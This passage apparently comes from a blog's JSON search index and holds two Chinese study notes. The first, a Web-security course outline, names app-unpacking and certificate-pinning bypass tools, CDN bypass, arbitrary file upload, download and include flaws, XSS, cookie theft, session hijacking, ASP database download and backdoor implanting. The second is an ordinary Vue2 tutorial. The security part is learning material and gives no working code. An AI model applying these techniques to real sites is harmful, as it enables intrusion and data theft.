installer（apk）\t\t#针对一些防止被反编译的App以及加壳的app,一般配合一些脱壳模块一起使用比如xposed模块和frida模块，以及使用JustTrustMe模块预防app证书验证从而防止被抓包Apk资源提取器（Apk）\t\t#提取某个App的资源，比如ICO，MD5，Hash等，接着利用黑暗引擎（如fofa）进行搜索相关资源资产Apk查壳工具（win）\t\t#查询App是否加壳，以及加了哪种壳安卓修改大师（win）\t\t\t#对apk进行资源提取，反编译等一些列操作，并对获取的资源进行修改并重新封装，但是有后门，尽量不要在真实机上使用&#x27;&#x27;&#x27;涉及的网站www.get-site-ip.com\t\t\t\t#用于绕过网站CDN，从而获取真实服务器的ip,结果是否准确需要自己判断\n\nPHP开发篇1.入门\nPHP入门-语法&amp;提交等\nMySQL入门-数据库操作\nHTML+CSS入门-样式编排\n工具\nPhpStorm：编写及调试php代码\nDreamweaver：前端页面编辑器\nphpStudy：集成式环境一键安装\nNavicat：数据库连接工具\n\n\n\n2.文件操作、上传、下载、删除、读取和写入等\n文件上传的类型：任意文件的上传\n代码自主写：自己写的上传代码\n编辑器引用：使用其他编辑器中集成的上传功能\n框架类的引用：使用现成框架中集成的上传功能\n\n\n文件下载类：任意文件下载\n直接URL访问：http://www.xiaodi.com/soft/软件.zip\n传参头部修改：http://www.xiaodi.com/soft/down.php?filename=软件.zip：**有安全问题**\n\n\n文件删除类：任意文件删除\n文件删除\n文件夹删除\n\n\n文件内容操作类：任意文件的读取和写入\n文件读取\n文件写入\n\n\n文件包含：任意文件包含：页面使用include包含（可以是本地文件，也可以是远程文件），包含代表脚本执行\n本地文件包含\n远程文件包含\n\n\n\n总结.Web漏洞核心\n可控变量\n特定函数：函数的多样化\n\n3.博客项目的输入输出类、留言板等\nPHP-全局变量：$_SERVER\n\nMysql：插入语法INSERT\n\n输入输出：XSS、反射、存储\n\n安全问题：XSS跨站、CSRF等\n\n\n4.个人博客项目的登陆验证、Cookie、Session、验证码安全\n后台验证：登陆用户逻辑安全\n后台验证：Cookie和Session\nCookie：身份验证 存储到客户端浏览器内\nCookie安全：Cokkie修改、伪造、盗取\n\n\nSession：身份验证 存储到服务端服务器内\nSession安全：会话劫持（Session劫持）\n\n\n\n\n后台验证：验证码和万能密码等\n\n5.个人博客项目：JS-Ajax、前端逻辑、购物、登陆和上传\nJS前端验证-文件上传\nJS-Ajax传递-登陆-状态\nJS-Ajax传递-购物-参数\n\n6.个人博客项目：TP框架、路由访问、安全写法和历史漏洞\n基于TP框架入门安装搭建使用\n基于TP框架内置安全写法评估\n基于TP框架实例源码安全性评估\n\nWeb攻防1.ASP安全、MDB下载植入、IIS短文件名、写权限和解析\nASP环境搭建组合：一般都是windows、iis、asp、access(数据库)或sqlserver\naccess数据库默认后缀为mdb（可以直接下载），或者也有后缀为asp和asa的，这种需要借助后门代码（评论区提交），最后借助caidao进行数据库访问；前提是需要知道数据库地址\n\n\nASP-数据库下载和植入\nIIS-短文件、解析和写权限\n\n案例演示\nASP-数据库-MDB默认下载\nASP-数据库-ASP后门植入连接\nASP-中间件-IIS短文件名探针-安全漏洞：类似扫描网站的目录文件，但只显示前六位，不依靠字典\nASP-中间件-IIS文件上传解析-安全漏洞\nASP-中间件-IIS配置目录读写-安全配置\n\n自己做一遍","categories":["note"],"tags":["Web安全"]},{"title":"vue2 学习笔记","url":"/2025/01/03/vue2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"笔记脚手架文件结构├── node_modules \n├── public\n│   ├── favicon.ico: 页签图标\n│   └── index.html: 主页面\n├── src\n│   ├── assets: 存放静态资源\n│   │   └── logo.png\n│   │── component: 存放组件\n│   │   └── HelloWorld.vue\n│   │── App.vue: 汇总所有组件\n│   │── main.js: 入口文件\n├── .gitignore: git版本管制忽略的配置\n├── babel.config.js: babel的配置文件\n├── package.json: 应用包配置文件 \n├── README.md: 应用描述文件\n├── package-lock.json：包版本控制文件\n\n关于不同版本的Vue\nvue.js与vue.runtime.xxx.js的区别：\nvue.js是完整版的Vue，包含：核心功能 + 模板解析器。\nvue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。\n\n\n因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。\n\nvue.config.js配置文件\n使用vue inspect &gt; output.js可以查看到Vue脚手架的默认配置。\n使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh\n\nref属性\n被用来给元素或子组件注册引用信息（id的替代者）\n应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）\n使用方式：\n打标识：&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt; 或 &lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;\n获取：this.$refs.xxx\n\n\n\nprops配置项\n功能：让组件接收外部传过来的数据\n\n传递数据：&lt;Demo name=&quot;xxx&quot;/&gt;\n\n接收数据：\n\n第一种方式（只接收）：props:[&#39;name&#39;] \n\n第二种方式（限制类型）：props:&#123;name:String&#125;\n\n第三种方式（限制类型、限制必要性、指定默认值）：\n props:&#123;\tname:&#123;\ttype:String, //类型\trequired:true, //必要性\tdefault:&#x27;老王&#x27; //默认值\t&#125;&#125;\n\n\n备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。\n\n\n\nmixin(混入)\n功能：可以把多个组件共用的配置提取成一个混入对象\n\n使用方式：\n 第一步定义混合：\n &#123;    data()&#123;....&#125;,    methods:&#123;....&#125;    ....&#125;\n\n 第二步使用混入：\n ​\t全局混入：Vue.mixin(xxx) ​\t局部混入：mixins:[&#39;xxx&#39;]\t\n\n\n插件\n功能：用于增强Vue\n\n本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。\n\n定义插件：\n 对象.install = function (Vue, options) &#123;    // 1. 添加全局过滤器    Vue.filter(....)    // 2. 添加全局指令    Vue.directive(....)    // 3. 配置全局混入(合)    Vue.mixin(....)    // 4. 添加实例方法    Vue.prototype.$myMethod = function () &#123;...&#125;    Vue.prototype.$myProperty = xxxx&#125;\n\n使用插件：Vue.use()\n\n\nscoped样式\n作用：让样式在局部生效，防止冲突。\n写法：&lt;style scoped&gt;\n\n总结TodoList案例\n组件化编码流程：\n ​\t(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。\n ​\t(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：\n ​\t\t\t1).一个组件在用：放在组件自身即可。\n ​\t\t\t2). 一些组件在用：放在他们共同的父组件上（状态提升）。\n ​\t(3).实现交互：从绑定事件开始。\n\nprops适用于：\n ​\t(1).父组件 &#x3D;&#x3D;&gt; 子组件 通信\n ​\t(2).子组件 &#x3D;&#x3D;&gt; 父组件 通信（要求父先给子一个函数）\n\n使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！\n\nprops传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。\n\n\nwebStorage\n存储内容大小一般支持5MB左右（不同浏览器可能还不一样）\n\n浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。\n\n相关API：\n\nxxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;);             该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。\n\nxxxxxStorage.getItem(&#39;person&#39;);\n ​\t\t该方法接受一个键名作为参数，返回键名对应的值。\n\nxxxxxStorage.removeItem(&#39;key&#39;);\n ​\t\t该方法接受一个键名作为参数，并把该键名从存储中删除。\n\n xxxxxStorage.clear()\n ​\t\t该方法会清空存储中的所有数据。\n\n\n\n备注：\n\nSessionStorage存储的内容会随着浏览器窗口关闭而消失。\nLocalStorage存储的内容，需要手动清除才会消失。\nxxxxxStorage.getItem(xxx)如果xxx对应的value获取不到，那么getItem的返回值是null。\nJSON.parse(null)的结果依然是null。\n\n\n\n组件的自定义事件\n一种组件间通信的方式，适用于：子组件 &#x3D;&#x3D;&#x3D;&gt; 父组件\n\n使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）。\n\n绑定自定义事件：\n\n第一种方式，在父组件中：&lt;Demo @atguigu=&quot;test&quot;/&gt;  或 &lt;Demo v-on:atguigu=&quot;test&quot;/&gt;\n\n第二种方式，在父组件中：\n &lt;Demo ref=&quot;demo&quot;/&gt;......mounted()&#123;   this.$refs.xxx.$on(&#x27;atguigu&#x27;,this.test)&#125;\n\n若想让自定义事件只能触发一次，可以使用once修饰符，或$once方法。\n\n\n\n触发自定义事件：this.$emit(&#39;atguigu&#39;,数据)\t\t\n\n解绑自定义事件this.$off(&#39;atguigu&#39;)\n\n组件上也可以绑定原生DOM事件，需要使用native修饰符。\n\n注意：通过this.$refs.xxx.$on(&#39;atguigu&#39;,回调)绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题！\n\n\n全局事件总线（GlobalEventBus）\n一种组件间通信的方式，适用于任意组件间通信。\n\n安装全局事件总线：\nnew Vue(&#123;\t......\tbeforeCreate() &#123;\t\tVue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm\t&#125;,    ......&#125;) \n\n使用事件总线：\n\n接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。\nmethods()&#123;  demo(data)&#123;......&#125;&#125;......mounted() &#123;  this.$bus.$on(&#x27;xxxx&#x27;,this.demo)&#125;\n\n提供数据：this.$bus.$emit(&#39;xxxx&#39;,数据)\n\n\n\n最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。\n\n\n消息订阅与发布（pubsub）\n一种组件间通信的方式，适用于任意组件间通信。\n\n使用步骤：\n\n安装pubsub：npm i pubsub-js\n\n引入: import pubsub from &#39;pubsub-js&#39;\n\n接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身。\nmethods()&#123;  demo(data)&#123;......&#125;&#125;......mounted() &#123;  this.pid = pubsub.subscribe(&#x27;xxx&#x27;,this.demo) //订阅消息&#125;\n\n提供数据：pubsub.publish(&#39;xxx&#39;,数据)\n\n最好在beforeDestroy钩子中，用PubSub.unsubscribe(pid)去取消订阅。\n\n\n\n\nnextTick\n语法：this.$nextTick(回调函数)\n作用：在下一次 DOM 更新结束后执行其指定的回调。\n什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。\n\nVue封装的过度与动画\n作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。\n\n图示：\n\n写法：\n\n准备好样式：\n\n元素进入的样式：\nv-enter：进入的起点\nv-enter-active：进入过程中\nv-enter-to：进入的终点\n\n\n元素离开的样式：\nv-leave：离开的起点\nv-leave-active：离开过程中\nv-leave-to：离开的终点\n\n\n\n\n使用&lt;transition&gt;包裹要过度的元素，并配置name属性：\n&lt;transition name=&quot;hello&quot;&gt;\t&lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;&lt;/transition&gt;\n\n备注：若有多个元素需要过度，则需要使用：&lt;transition-group&gt;，且每个元素都要指定key值。\n\n\n\n\nvue脚手架配置代理方法一​\t在vue.config.js中添加如下配置：\ndevServer:&#123;  proxy:&quot;http://localhost:5000&quot;&#125;\n\n说明：\n\n优点：配置简单，请求资源时直接发给前端（8080）即可。\n缺点：不能配置多个代理，不能灵活的控制请求是否走代理。\n工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）\n\n方法二​\t编写vue.config.js配置具体代理规则：\nmodule.exports = &#123;\tdevServer: &#123;      proxy: &#123;      &#x27;/api1&#x27;: &#123;// 匹配所有以 &#x27;/api1&#x27;开头的请求路径        target: &#x27;http://localhost:5000&#x27;,// 代理目标的基础路径        changeOrigin: true,        pathRewrite: &#123;&#x27;^/api1&#x27;: &#x27;&#x27;&#125;      &#125;,      &#x27;/api2&#x27;: &#123;// 匹配所有以 &#x27;/api2&#x27;开头的请求路径        target: &#x27;http://localhost:5001&#x27;,// 代理目标的基础路径        changeOrigin: true,        pathRewrite: &#123;&#x27;^/api2&#x27;: &#x27;&#x27;&#125;      &#125;    &#125;  &#125;&#125;/*   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080   changeOrigin默认值为true*/\n\n说明：\n\n优点：可以配置多个代理，且可以灵活的控制请求是否走代理。\n缺点：配置略微繁琐，请求资源时必须加前缀。\n\n插槽\n作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 父组件 &#x3D;&#x3D;&#x3D;&gt; 子组件 。\n\n分类：默认插槽、具名插槽、作用域插槽\n\n使用方式：\n\n默认插槽：\n父组件中：        &lt;Category&gt;           &lt;div&gt;html结构1&lt;/div&gt;        &lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽 --&gt;               &lt;slot&gt;插槽默认内容...&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;\n\n具名插槽：\n父组件中：        &lt;Category&gt;            &lt;template slot=&quot;center&quot;&gt;              &lt;div&gt;html结构1&lt;/div&gt;            &lt;/template&gt;            &lt;template v-slot:footer&gt;               &lt;div&gt;html结构2&lt;/div&gt;            &lt;/template&gt;        &lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽 --&gt;               &lt;slot name=&quot;center&quot;&gt;插槽默认内容...&lt;/slot&gt;               &lt;slot name=&quot;footer&quot;&gt;插槽默认内容...&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;\n\n作用域插槽：\n\n理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）\n\n具体编码：\n父组件中：\t\t&lt;Category&gt;\t\t\t&lt;template scope=&quot;scopeData&quot;&gt;\t\t\t\t&lt;!-- 生成的是ul列表 --&gt;\t\t\t\t&lt;ul&gt;\t\t\t\t\t&lt;li v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/li&gt;\t\t\t\t&lt;/ul&gt;\t\t\t&lt;/template&gt;\t\t&lt;/Category&gt;\t\t&lt;Category&gt;\t\t\t&lt;template slot-scope=&quot;scopeData&quot;&gt;\t\t\t\t&lt;!-- 生成的是h4标题 --&gt;\t\t\t\t&lt;h4 v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/h4&gt;\t\t\t&lt;/template&gt;\t\t&lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;                &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;\t\t        &lt;script&gt;            export default &#123;                name:&#x27;Category&#x27;,                props:[&#x27;title&#x27;],                //数据在子组件自身                data() &#123;                    return &#123;                        games:[&#x27;红色警戒&#x27;,&#x27;穿越火线&#x27;,&#x27;劲舞团&#x27;,&#x27;超级玛丽&#x27;]                    &#125;                &#125;,            &#125;        &lt;/script&gt;\n\n\n\n   \n\nVuex1.概念​\t\t在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读&#x2F;写），也是一种组件间通信的方式，且适用于任意组件间通信。\n2.何时使用？​\t\t多个组件需要共享数据时\n3.搭建vuex环境\n创建文件：src/store/index.js\n//引入Vue核心库import Vue from &#x27;vue&#x27;//引入Vueximport Vuex from &#x27;vuex&#x27;//应用Vuex插件Vue.use(Vuex)//准备actions对象——响应组件中用户的动作const actions = &#123;&#125;//准备mutations对象——修改state中的数据const mutations = &#123;&#125;//准备state对象——保存具体的数据const state = &#123;&#125;//创建并暴露storeexport default new Vuex.Store(&#123;\tactions,\tmutations,\tstate&#125;)\n\n在main.js中创建vm时传入store配置项\n......//引入storeimport store from &#x27;./store&#x27;......//创建vmnew Vue(&#123;\tel:&#x27;#app&#x27;,\trender: h =&gt; h(App),\tstore&#125;)\n\n4.基本使用\n初始化数据、配置actions、配置mutations，操作文件store.js\n//引入Vue核心库import Vue from &#x27;vue&#x27;//引入Vueximport Vuex from &#x27;vuex&#x27;//引用VuexVue.use(Vuex)const actions = &#123;    //响应组件中加的动作\tjia(context,value)&#123;\t\t// console.log(&#x27;actions中的jia被调用了&#x27;,miniStore,value)\t\tcontext.commit(&#x27;JIA&#x27;,value)\t&#125;,&#125;const mutations = &#123;    //执行加\tJIA(state,value)&#123;\t\t// console.log(&#x27;mutations中的JIA被调用了&#x27;,state,value)\t\tstate.sum += value\t&#125;&#125;//初始化数据const state = &#123;   sum:0&#125;//创建并暴露storeexport default new Vuex.Store(&#123;\tactions,\tmutations,\tstate,&#125;)\n\n组件中读取vuex中的数据：$store.state.sum\n\n组件中修改vuex中的数据：$store.dispatch(&#39;action中的方法名&#39;,数据) 或 $store.commit(&#39;mutations中的方法名&#39;,数据)\n\n 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写dispatch，直接编写commit\n\n\n\n5.getters的使用\n概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。\n\n在store.js中追加getters配置\n......const getters = &#123;\tbigSum(state)&#123;\t\treturn state.sum * 10\t&#125;&#125;//创建并暴露storeexport default new Vuex.Store(&#123;\t......\tgetters&#125;)\n\n组件中读取数据：$store.getters.bigSum\n\n\n6.四个map方法的使用\nmapState方法：用于帮助我们映射state中的数据为计算属性\ncomputed: &#123;    //借助mapState生成计算属性：sum、school、subject（对象写法）     ...mapState(&#123;sum:&#x27;sum&#x27;,school:&#x27;school&#x27;,subject:&#x27;subject&#x27;&#125;),             //借助mapState生成计算属性：sum、school、subject（数组写法）    ...mapState([&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;subject&#x27;]),&#125;,\n\nmapGetters方法：用于帮助我们映射getters中的数据为计算属性\ncomputed: &#123;    //借助mapGetters生成计算属性：bigSum（对象写法）    ...mapGetters(&#123;bigSum:&#x27;bigSum&#x27;&#125;),    //借助mapGetters生成计算属性：bigSum（数组写法）    ...mapGetters([&#x27;bigSum&#x27;])&#125;,\n\nmapActions方法：用于帮助我们生成与actions对话的方法，即：包含$store.dispatch(xxx)的函数\nmethods:&#123;    //靠mapActions生成：incrementOdd、incrementWait（对象形式）    ...mapActions(&#123;incrementOdd:&#x27;jiaOdd&#x27;,incrementWait:&#x27;jiaWait&#x27;&#125;)    //靠mapActions生成：incrementOdd、incrementWait（数组形式）    ...mapActions([&#x27;jiaOdd&#x27;,&#x27;jiaWait&#x27;])&#125;\n\nmapMutations方法：用于帮助我们生成与mutations对话的方法，即：包含$store.commit(xxx)的函数\nmethods:&#123;    //靠mapActions生成：increment、decrement（对象形式）    ...mapMutations(&#123;increment:&#x27;JIA&#x27;,decrement:&#x27;JIAN&#x27;&#125;),        //靠mapMutations生成：JIA、JIAN（对象形式）    ...mapMutations([&#x27;JIA&#x27;,&#x27;JIAN&#x27;]),&#125;\n\n\n备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。\n\n7.模块化+命名空间\n目的：让代码更好维护，让多种数据分类更加明确。\n\n修改store.js\nconst countAbout = &#123;  namespaced:true,//开启命名空间  state:&#123;x:1&#125;,  mutations: &#123; ... &#125;,  actions: &#123; ... &#125;,  getters: &#123;    bigSum(state)&#123;       return state.sum * 10    &#125;  &#125;&#125;const personAbout = &#123;  namespaced:true,//开启命名空间  state:&#123; ... &#125;,  mutations: &#123; ... &#125;,  actions: &#123; ... &#125;&#125;const store = new Vuex.Store(&#123;  modules: &#123;    countAbout,    personAbout  &#125;&#125;)\n\n开启命名空间后，组件中读取state数据：\n//方式一：自己直接读取this.$store.state.personAbout.list//方式二：借助mapState读取：...mapState(&#x27;countAbout&#x27;,[&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;subject&#x27;]),\n\n开启命名空间后，组件中读取getters数据：\n//方式一：自己直接读取this.$store.getters[&#x27;personAbout/firstPersonName&#x27;]//方式二：借助mapGetters读取：...mapGetters(&#x27;countAbout&#x27;,[&#x27;bigSum&#x27;])\n\n开启命名空间后，组件中调用dispatch\n//方式一：自己直接dispatchthis.$store.dispatch(&#x27;personAbout/addPersonWang&#x27;,person)//方式二：借助mapActions：...mapActions(&#x27;countAbout&#x27;,&#123;incrementOdd:&#x27;jiaOdd&#x27;,incrementWait:&#x27;jiaWait&#x27;&#125;)\n\n开启命名空间后，组件中调用commit\n//方式一：自己直接committhis.$store.commit(&#x27;personAbout/ADD_PERSON&#x27;,person)//方式二：借助mapMutations：...mapMutations(&#x27;countAbout&#x27;,&#123;increment:&#x27;JIA&#x27;,decrement:&#x27;JIAN&#x27;&#125;),\n\n路由\n理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。\n前端路由：key是路径，value是组件。\n\n1.基本使用\n安装vue-router，命令：npm i vue-router\n\n应用插件：Vue.use(VueRouter)\n\n编写router配置项:\n//引入VueRouterimport VueRouter from &#x27;vue-router&#x27;//引入Luyou 组件import About from &#x27;../components/About&#x27;import Home from &#x27;../components/Home&#x27;//创建router实例对象，去管理一组一组的路由规则const router = new VueRouter(&#123;\troutes:[\t\t&#123;\t\t\tpath:&#x27;/about&#x27;,\t\t\tcomponent:About\t\t&#125;,\t\t&#123;\t\t\tpath:&#x27;/home&#x27;,\t\t\tcomponent:Home\t\t&#125;\t]&#125;)//暴露routerexport default router\n\n实现切换（active-class可配置高亮样式）\n&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;\n\n指定展示位置\n&lt;router-view&gt;&lt;/router-view&gt;\n\n2.几个注意点\n路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹。\n通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。\n每个组件都有自己的$route属性，里面存储着自己的路由信息。\n整个应用只有一个router，可以通过组件的$router属性获取到。\n\n3.多级路由（多级路由）\n配置路由规则，使用children配置项：\nroutes:[\t&#123;\t\tpath:&#x27;/about&#x27;,\t\tcomponent:About,\t&#125;,\t&#123;\t\tpath:&#x27;/home&#x27;,\t\tcomponent:Home,\t\tchildren:[ //通过children配置子级路由\t\t\t&#123;\t\t\t\tpath:&#x27;news&#x27;, //此处一定不要写：/news\t\t\t\tcomponent:News\t\t\t&#125;,\t\t\t&#123;\t\t\t\tpath:&#x27;message&#x27;,//此处一定不要写：/message\t\t\t\tcomponent:Message\t\t\t&#125;\t\t]\t&#125;]\n\n跳转（要写完整路径）：\n&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;\n\n4.路由的query参数\n传递参数\n&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;/home/message/detail?id=666&amp;title=你好&quot;&gt;跳转&lt;/router-link&gt;\t\t\t\t&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;&lt;router-link \t:to=&quot;&#123;\t\tpath:&#x27;/home/message/detail&#x27;,\t\tquery:&#123;\t\t   id:666,            title:&#x27;你好&#x27;\t\t&#125;\t&#125;&quot;&gt;跳转&lt;/router-link&gt;\n\n接收参数：\n$route.query.id$route.query.title\n\n5.命名路由\n作用：可以简化路由的跳转。\n\n如何使用\n\n给路由命名：\n&#123;\tpath:&#x27;/demo&#x27;,\tcomponent:Demo,\tchildren:[\t\t&#123;\t\t\tpath:&#x27;test&#x27;,\t\t\tcomponent:Test,\t\t\tchildren:[\t\t\t\t&#123;                      name:&#x27;hello&#x27; //给路由命名\t\t\t\t\tpath:&#x27;welcome&#x27;,\t\t\t\t\tcomponent:Hello,\t\t\t\t&#125;\t\t\t]\t\t&#125;\t]&#125;\n\n简化跳转：\n&lt;!--简化前，需要写完整的路径 --&gt;&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;跳转&lt;/router-link&gt;&lt;!--简化后，直接通过名字跳转 --&gt;&lt;router-link :to=&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;&gt;跳转&lt;/router-link&gt;&lt;!--简化写法配合传递参数 --&gt;&lt;router-link \t:to=&quot;&#123;\t\tname:&#x27;hello&#x27;,\t\tquery:&#123;\t\t   id:666,            title:&#x27;你好&#x27;\t\t&#125;\t&#125;&quot;&gt;跳转&lt;/router-link&gt;\n\n\n\n6.路由的params参数\n配置路由，声明接收params参数\n&#123;\tpath:&#x27;/home&#x27;,\tcomponent:Home,\tchildren:[\t\t&#123;\t\t\tpath:&#x27;news&#x27;,\t\t\tcomponent:News\t\t&#125;,\t\t&#123;\t\t\tcomponent:Message,\t\t\tchildren:[\t\t\t\t&#123;\t\t\t\t\tname:&#x27;xiangqing&#x27;,\t\t\t\t\tpath:&#x27;detail/:id/:title&#x27;, //使用占位符声明接收params参数\t\t\t\t\tcomponent:Detail\t\t\t\t&#125;\t\t\t]\t\t&#125;\t]&#125;\n\n传递参数\n&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;/home/message/detail/666/你好&quot;&gt;跳转&lt;/router-link&gt;\t\t\t\t&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;&lt;router-link \t:to=&quot;&#123;\t\tname:&#x27;xiangqing&#x27;,\t\tparams:&#123;\t\t   id:666,            title:&#x27;你好&#x27;\t\t&#125;\t&#125;&quot;&gt;跳转&lt;/router-link&gt;\n\n\n特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！\n\n\n接收参数：\n$route.params.id$route.params.title\n\n7.路由的props配置​\t作用：让路由组件更方便的收到参数\n&#123;\tname:&#x27;xiangqing&#x27;,\tpath:&#x27;detail/:id&#x27;,\tcomponent:Detail,\t//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件\t// props:&#123;a:900&#125;\t//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件\t// props:true\t\t//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件\tprops(route)&#123;\t\treturn &#123;\t\t\tid:route.query.id,\t\t\ttitle:route.query.title\t\t&#125;\t&#125;&#125;\n\n8.&lt;router-link&gt;的replace属性\n作用：控制路由跳转时操作浏览器历史记录的模式\n浏览器的历史记录有两种写入方式：分别为push和replace，push是追加历史记录，replace是替换当前记录。路由跳转时候默认为push\n如何开启replace模式：&lt;router-link replace .......&gt;News&lt;/router-link&gt;\n\n9.编程式路由导航\n作用：不借助&lt;router-link&gt; 实现路由跳转，让路由跳转更加灵活\n\n具体编码：\n//$router的两个APIthis.$router.push(&#123;\tname:&#x27;xiangqing&#x27;,\t\tparams:&#123;\t\t\tid:xxx,\t\t\ttitle:xxx\t\t&#125;&#125;)this.$router.replace(&#123;\tname:&#x27;xiangqing&#x27;,\t\tparams:&#123;\t\t\tid:xxx,\t\t\ttitle:xxx\t\t&#125;&#125;)this.$router.forward() //前进this.$router.back() //后退this.$router.go() //可前进也可后退\n\n10.缓存路由组件\n作用：让不展示的路由组件保持挂载，不被销毁。\n\n具体编码：\n&lt;keep-alive include=&quot;News&quot;&gt;     &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;\n\n11.两个新的生命周期钩子\n作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。\n具体名字：\nactivated路由组件被激活时触发。\ndeactivated路由组件失活时触发。\n\n\n\n12.路由守卫\n作用：对路由进行权限控制\n\n分类：全局守卫、独享守卫、组件内守卫\n\n全局守卫:\n//全局前置守卫：初始化时执行、每次路由切换前执行router.beforeEach((to,from,next)=&gt;&#123;\tconsole.log(&#x27;beforeEach&#x27;,to,from)\tif(to.meta.isAuth)&#123; //判断当前路由是否需要进行权限控制\t\tif(localStorage.getItem(&#x27;school&#x27;) === &#x27;atguigu&#x27;)&#123; //权限控制的具体规则\t\t\tnext() //放行\t\t&#125;else&#123;\t\t\talert(&#x27;暂无权限查看&#x27;)\t\t\t// next(&#123;name:&#x27;guanyu&#x27;&#125;)\t\t&#125;\t&#125;else&#123;\t\tnext() //放行\t&#125;&#125;)//全局后置守卫：初始化时执行、每次路由切换后执行router.afterEach((to,from)=&gt;&#123;\tconsole.log(&#x27;afterEach&#x27;,to,from)\tif(to.meta.title)&#123; \t\tdocument.title = to.meta.title //修改网页的title\t&#125;else&#123;\t\tdocument.title = &#x27;vue_test&#x27;\t&#125;&#125;)\n\n独享守卫:\nbeforeEnter(to,from,next)&#123;\tconsole.log(&#x27;beforeEnter&#x27;,to,from)\tif(to.meta.isAuth)&#123; //判断当前路由是否需要进行权限控制\t\tif(localStorage.getItem(&#x27;school&#x27;) === &#x27;atguigu&#x27;)&#123;\t\t\tnext()\t\t&#125;else&#123;\t\t\talert(&#x27;暂无权限查看&#x27;)\t\t\t// next(&#123;name:&#x27;guanyu&#x27;&#125;)\t\t&#125;\t&#125;else&#123;\t\tnext()\t&#125;&#125;\n\n组件内守卫：\n//进入守卫：通过路由规则，进入该组件时被调用beforeRouteEnter (to, from, next) &#123;&#125;,//离开守卫：通过路由规则，离开该组件时被调用beforeRouteLeave (to, from, next) &#123;&#125;\n\n13.路由器的两种工作模式\n对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。\nhash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。\nhash模式：\n地址中永远带着#号，不美观 。\n若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。\n兼容性较好。\n\n\nhistory模式：\n地址干净，美观 。\n兼容性和hash模式相比略差。\n应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。\n\n\n\n","categories":["note"],"tags":["Vue"]},{"title":"网络安全 